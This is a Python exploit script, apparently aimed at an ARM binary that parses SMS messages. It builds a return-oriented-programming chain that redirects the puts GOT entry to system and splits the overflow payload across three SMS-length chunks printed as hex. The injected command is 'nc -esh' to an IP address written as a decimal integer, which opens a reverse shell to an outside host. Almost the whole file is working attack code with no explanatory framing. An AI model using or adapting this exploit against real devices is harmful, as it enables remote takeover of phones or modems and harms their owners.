#!/usr/bin/env python3

import struct



def p32(x):
    return struct.pack('<I', x)

off_puts = 0x4b3f0
off_system = 0x2f014

GOT = 0x32104
PLT = 0x114e0
GOT_DIFF = (off_system - off_puts) % 2**32
SCRATCH = 0x36f00

def write(where, what):
    global rop

    # 0x000172a6 : pop {r2, r3, r4, pc}
    rop += p32(0x172a7)
    rop += p32(0x4141) # r2
    rop += p32(where) # r3
    rop += p32(what) # r4

    # + 0x13568           601C                      str      r4, [r3, #0]
    # + 0x1356a           4608                      mov      r0, r1
    # + 0x1356c           BD10                      pop      {r4, pc}
    rop += p32(0x13569)
    rop += p32(0x4141)


    '''
    # 0x000172a6 : pop {r2, r3, r4, pc}
    rop += p32(0x172a7)
    rop += p32(what)
    rop += p32(0x4141) # r3
    rop += p32(0x4242) # r4
    # 0x12a6a           BD08                      pop      {r3, pc}
    rop += p32(0x12a6b)
    rop += p32(where)
    # 0x13ad2           601A                      str      r2, [r3, #0]
    # 0x13ad4           BD10                      pop      {r4, pc}
    rop += p32(0x13ad3)
    rop += p32(0x4141) # r4
    '''


def reg_control(lr, pc):
    global rop

    write(SCRATCH+4, pc)
    write(SCRATCH, lr)

    # 0x216a0           BD29                      pop      {r0, r3, r5, pc}
    rop += p32(0x216a1)
    rop += p32(1)       # r0
    rop += p32(0x4141)  # r3
    rop += p32(0x4141)  # r5

    # 0x13ac4           BD10                      pop      {r4, pc}
    rop += p32(0x13ac5)
    rop += p32(0)

    # 0x13ac0           42A0                      cmp      r0, r4
    # 0x13ac2           D000                      beq.n    0x13ac6
    # 0x13ac4           BD10                      pop      {r4, pc}
    rop += p32(0x13ac1)
    rop += p32(SCRATCH+4) # r4

    # 0x12acc               8814DAF7
    #           ldmdahi r4, {r0, r1, r2, r4, r5, r6, r7, r9, fp, ip, lr, pc}
    rop += p32(0x12acc)


rop = b''

# 0x111c4: pop {r3, pc}
reg_control(lr=0x111c4, pc=0x216a1)

# 0x216a0  pop      {r0, r3, r5, pc}
rop += p32(GOT - 0x60)  # r0
rop += p32(0x216a1)       # r3
rop += p32(SCRATCH - 0x40)           # r5

 # + 0x12658         6E02                 ldr     r2, [r0, #96]   ; 0x60
 # + 0x1265a         642C                 str      r4, [r5, #64]   ; 0x40
 # + 0x1265c         4500E9DD             ldrd     r4, r5, [sp]
 # + 0x12660         B004                 add      sp, #16
 # + 0x12662         4718                 bx       r3
rop += p32(0x12659)
rop += p32(0x4141)  # r4
rop += p32(0x4242)  # r5
rop += p32(0x4343)  # dummy
rop += p32(0x4444)  # dummy

# 0x216a0           BD29                      pop      {r0, r3, r5, pc}
rop += p32(GOT_DIFF) # r0
rop += p32(GOT) # r3
rop += p32(0x4141) # r5

# + 0x15bca           4402                      add      r2, r0
# + 0x15bcc           601A                      str      r2, [r3, #0]
# + 0x15bce           4770                      bx       lr
rop += p32(0x15bcb)

rop += p32(0x4141) # dummy

cmd = b'nc -esh 2547646076 1'
for i in range(0,len(cmd), 4):
    write(SCRATCH+i, struct.unpack('<I',cmd[i:i+4])[0])

# 0x216a0  pop      {r0, r3, r5, pc}
rop += p32(0x216a1)
rop += p32(SCRATCH) # r0
rop += p32(0x4141) # r3
rop += p32(0x4242) # r5
rop += p32(PLT)








PAYLOAD = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRST"
PAYLOAD += rop


SMS_LEN = 140-6
PAYLOAD = PAYLOAD.ljust(SMS_LEN*3, b'A')

assert(len(PAYLOAD) == 3*SMS_LEN)

sms = [PAYLOAD[i:i+SMS_LEN] for i in range(0, len(PAYLOAD), SMS_LEN)]
for s in sms:
    cstr = "\\x" + "\\x".join("{:02x}".format(c) for c in s)
    print(cstr)
